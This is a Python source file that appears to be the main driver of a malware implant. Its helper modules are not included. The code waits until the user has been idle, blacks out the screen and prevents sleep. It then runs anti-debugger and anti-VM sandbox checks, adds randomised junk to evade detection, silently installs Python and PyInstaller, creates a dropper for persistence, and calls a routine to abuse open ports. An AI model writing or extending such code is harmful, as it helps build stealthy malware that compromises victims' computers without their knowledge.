import sys
from time import sleep
from Persistance.foothold import get_pyinstaller,install_python,create_dropper
from Utils.helpers import is_python_exist,is_online,find_python_path,is_admin
from threading import Thread
from Evasion import debugEvasion,vmDetect
from Evasion.utils import is_normal_browser_user,get_idle_duration,prevent_sleep,turn_screen_off
from Exploitation.common import abuse_open_ports
from Evasion.Randomize import random_base64,random_byte,random_list,random_a85
from random import randrange,choice
#//TODO: instead of sys.exit. spawn subprocess to delete the whole thing before.
def main():
    Thread(target=debugEvasion.process_monitor,args=()).start()
    debug = True #if true -- vm evasion will result only in printing!
    vm_flag = sys.exit if not debug else lambda x: print(x)
    prevent_sleep()
    if not debug :
        while get_idle_duration() < 180:
            sleep(180)
    if not debug:
        turn_screen_off()
    """
    if we are here, get_idle_duration is higher than 180. so user didn't touched anything for 180 seconds atleast
    we run prevent sleep to prevent the pc from actually sleeping
    we make the screen black
    and we start!
    """
    if any([not vmDetect.is_enough_ram(),not vmDetect.is_enough_disk(), not vmDetect.is_enough_cores()]):
        vm_flag("EXITED ON ANY_SPEC CHECK") #Stop exec if we suspect that's vm/sandbox by resource check
    #//TODO: add doc
    if not is_online():
        vm_flag('NOT ONLINE') #another vm evade check
    if debugEvasion.find_debug_process():
        vm_flag("we found debug process") # stop exec if we have debug process somewhere
    if not is_normal_browser_user():
        vm_flag("not a normal browser user")
    if vmDetect.detect_vm_by_wmi():
        vm_flag("detected vm by wmi") #another vm evade
        #we do the detect_vm as last check as this is noisy AF
    ALLOC_RANDOM = randrange(1 , 10)
    if ALLOC_RANDOM > 6:
        x = choice([random_base64,random_byte,random_a85,random_list])()
        #we have chance of 30% to get here, and if we get here, we choose from 4 functions
        # each of this functions have 50% chance to return something else.
        #random it is.
    if not is_python_exist():
        install_python()

    pythonPath = find_python_path()
    if get_pyinstaller(pythonPath):
        #WE INSTALLED PYINSTALLER, POSSIBLY COMPILING
        #//TODO 35: FIND A WAY TO CHECK IF WE COMPILED THE BOOTLOADER
        #what next?
        pass
    create_dropper() #in the end, when we installed everything --> we create dropper
    abuse_open_ports()
    return


if __name__ == "__main__":
    main()